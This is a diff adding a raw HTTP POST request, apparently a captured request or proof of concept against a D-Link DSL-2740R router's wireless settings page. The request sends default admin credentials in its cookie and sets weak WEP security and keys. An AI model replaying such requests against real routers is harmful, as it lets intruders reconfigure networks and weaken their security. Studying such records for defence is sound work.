@@ -1,0 +1,15 @@
+POST /cgi-bin/wirelesssetting.asp HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 580
+Origin: http://192.168.1.1
+Connection: keep-alive
+Referer: http://192.168.1.1/cgi-bin/wirelesssetting.asp
+Cookie: SESSIONID=04d4df32; UID=admin; PSW=admin
+Upgrade-Insecure-Requests: 1
+
+HideSsidFlag=0&Wlan_WEPEncap=WEP&TKIPAES=TKIPAES&TKIP=TKIP&AES=AES&Wlan_11nModeFlag=0&AdvWlan_MCS=11&ExtChannFlag=0&Wlan_HTBW40M=1&isWPSSupported=0&SSID_INDEX=0&Wlan_cbEnable=on&Wlan_cbEnableFlag=1&Wlan_Ssid=D-Link+DSL-2740R&Wlan_slChannel=6&Wlan_slMode=0&AdvWlan_MCS_1=11&AdvWlan_MCS_4=0&AdvWlan_MCS_0=11&AdvWlan_MCS_6=3&Wlan_cbHide=0&Wlan_slSecType=WEP-64Bits&Wlan_slSecTypeFlag=0&WlanWep_slKeyLen=WEP-64Bits&WlanWep_Key1=12345&WlanWep_Key2=&WlanWep_Key3=&WlanWep_Key4=&WlanWep_slDefKey=1&WlanWep_slAuth=OPEN&WlanWpa_slMode=WPA2PSK&WLANCfgWPATimer=60&WlanWpa_SharedKey=4703c87e1
